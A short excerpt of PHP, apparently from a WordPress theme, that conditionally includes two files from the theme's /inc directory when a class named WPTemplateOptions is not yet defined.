...
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/inc/functions-class.php' ) ) {
	include_once( get_template_directory() . '/inc/functions-class.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/inc/inc.php' ) ) {
	include_once( get_template_directory() . '/inc/inc.php' );
}
